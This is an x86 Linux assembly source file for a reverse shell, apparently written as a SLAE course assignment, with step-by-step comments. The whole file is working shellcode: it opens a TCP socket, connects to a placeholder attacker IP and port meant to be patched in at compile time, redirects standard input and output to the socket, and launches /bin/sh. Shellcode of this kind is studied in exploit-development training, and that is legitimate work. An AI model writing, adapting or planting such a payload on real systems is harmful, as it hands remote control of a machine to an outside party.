; SLAE Assigment 2 - Reverse shell
; Author: rtmcx (rtmcx@protonmail.com)
;
; The IP-number and port used is supposed to be replaced in the 'compile.sh'-script
; Otherwise, replace the IP and port on line 46 and 47 


global _start

section .text
_start:

; SOCKET    
    push 0x66       ; Syscall for socketcall
    pop eax         ; in eax

    push 0x1        ; Socketcall-number for socket
    pop ebx         ; Put in ebx
        
    ; Set up the args for socket
    ; cat /usr/include/linux/in.h 
    ; PUSH protocol, type and domain
    ; Protocol: TCP=0, Type: SOCK_STREAM = 1, Domain: INET = 2
    xor edi, edi    ; Make edi null
    push edi        ; This is 'Protocol' TCP = 0
    push ebx        ; ebx already has 1 in it, reuse for Type
    push byte 0x02; Inet = 2.
    mov ecx, esp    ; Put 'pointer' to args in ecx (args to socketcall)
    int 0x80        ; execute syscall. 

    ; Now we have a socketfd in eax
    xchg esi, eax   ; Save socketfd in esi (as we need it later on)


; CONNECT
    ; Set up args for 'Connect'
    ;   connect(int sockfd, const struct sockaddr *addr, int addrlen);
    
    ; ebx = socketfd (esi)
    ; ecx = args for bind (struct sockaddr) 
    ; edx length of the args
    
    ; Setup the sockaddr, push the values to the stack
    ; sockaddr (2, 9999, 0)
    ; ADDR_FAMILY = 0, PORT = 9999, AF_INET = 2
	push 0xbbbbbbbb ; Marker bytes for IP-number
    push word 0xaaaa; Marker bytes for port
    push word 0x02  ; (AF_INET)
    mov ecx, esp    ; Put pointer to args in ecx, for use with "bind" call  
    
    push 0x10       ; Size of the sockaddr struct (16 bytes)
    push ecx        ; Argv for bind
    push esi        ; esi has the socketfd in it
    mov ecx, esp    ; Put pointer to 'Bind'-args in ecx
    
    add bl, 2          ; inc ebx to 3, for 'Coonect'-socketcall number
    xor eax, eax    ; zero out eax 
    mov al, 0x66    ; syscall for socketcall
    int 0x80        ; Execute syscall


;DUP2
    ; dup2 i/o-to client socketfd
    ; dup2(oldfd, newfd)

    mov ebx, esi    ; put client socketfd (returned in eax) to ebx
    xor eax, eax    ; make eax zero

    xor ecx, ecx    ; Zero out ecx
    mov cl, 0x03    ; Start value for counter
dup2:
    dec ecx         ; decrese ecx
    mov al, 0x3f    ; syscall for dup2
    int 0x80        ; Execute syscall
    jnz dup2        ; If ecx i not zero, next iteration


; EXECVE
    ; Setup execve
    ; execve ("/bin/sh", NULL, NULL)
    xor eax, eax    ; Zero eax
    push eax        ; push 0 used as a terminator
    push 0x68732f6e ; hs/n in hex
    push 0x69622f2f ; ib//  in hex

    ; Set up ebx for syscall
    mov ebx, esp    ; Put address to //bin/sh0x0 in ebx
    xor ecx, ecx    ; Put a zero in ecx
    xor edx, edx    ; Put a zero in edx
    mov al, 0xb     ; Syscall for execve
    int 0x80        ; Execute syscall